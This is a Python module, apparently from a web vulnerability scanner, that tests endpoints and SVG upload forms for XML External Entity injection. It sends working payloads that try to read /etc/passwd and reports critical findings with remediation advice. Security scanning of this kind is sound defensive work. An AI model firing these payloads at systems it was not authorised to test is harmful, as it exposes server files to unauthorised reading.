import asyncio
import logging
from core.finding import Finding
from core.http_client import make_client, PROBE_TIMEOUT

logger = logging.getLogger(__name__)

XXE_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>"""

PASSWD_INDICATOR = "root:x:"


class Xxe:
    async def run(self, ctx: dict) -> list[Finding]:
        findings: list[Finding] = []
        forms = ctx.get("forms", [])
        endpoints = ctx.get("endpoints", [])
        limiter = ctx["limiter"]
        sem = asyncio.Semaphore(10)

        async def probe_ep(ep: str):
            f = await self._test_endpoint(ep, limiter, sem)
            if f:
                findings.append(f)

        async def probe_form(form: dict):
            if any("file" in i.lower() or "upload" in i.lower() for i in form.get("inputs", [])):
                f = await self._test_svg_upload(form, limiter, sem)
                if f:
                    findings.append(f)

        await asyncio.gather(
            *[probe_ep(ep) for ep in endpoints[:100]],
            *[probe_form(f) for f in forms[:20]],
        )
        logger.info(f"Xxe completed — {len(findings)} finding(s)")
        return findings

    async def _test_endpoint(self, url: str, limiter, sem) -> Finding | None:
        async with sem:
            try:
                async with limiter.acquire():
                    async with make_client(timeout=PROBE_TIMEOUT) as client:
                        r = await client.post(
                            url,
                            content=XXE_PAYLOAD.encode(),
                            headers={"Content-Type": "application/xml"},
                        )

                if PASSWD_INDICATOR in r.text:
                    return Finding(
                        title="XXE: XML External Entity Injection (File Read)",
                        severity="Critical",
                        description="The XML parser processed an external entity and returned contents of /etc/passwd.",
                        affected_url=url,
                        proof=f"POST {url}\nContent-Type: application/xml\n{XXE_PAYLOAD[:200]}\n\nHTTP {r.status_code}\n{r.text[:500]}",
                        remediation="Disable external entity processing in your XML parser. Use a library that defaults to safe parsing.",
                        impact=5, likelihood=4,
                        module="Xxe",
                        references=["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
                    )

                if any(ind in r.text.lower() for ind in ["xml", "entity", "doctype", "parse error"]):
                    logger.debug(f"XXE: XML error response from {url}")

            except Exception as e:
                logger.debug(f"XXE probe error {url}: {type(e).__name__}: {e}")
        return None

    async def _test_svg_upload(self, form: dict, limiter, sem) -> Finding | None:
        svg_xxe = b'<?xml version="1.0"?>\n<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<svg><text>&xxe;</text></svg>'
        action = form.get("action", "")
        async with sem:
            try:
                async with limiter.acquire():
                    async with make_client(timeout=PROBE_TIMEOUT) as client:
                        r = await client.post(
                            action,
                            files={"file": ("test.svg", svg_xxe, "image/svg+xml")},
                        )
                if PASSWD_INDICATOR in r.text:
                    return Finding(
                        title="XXE via SVG File Upload",
                        severity="Critical",
                        description="SVG upload at this endpoint processes external entities, exposing server files.",
                        affected_url=action,
                        proof=f"POST {action} (SVG file upload)\nHTTP {r.status_code}\n{r.text[:300]}",
                        remediation="Sanitize SVG uploads. Process with a safe SVG parser that strips entity definitions.",
                        impact=5, likelihood=3,
                        module="Xxe",
                    )
            except Exception as e:
                logger.debug(f"SVG XXE error {action}: {type(e).__name__}: {e}")
        return None
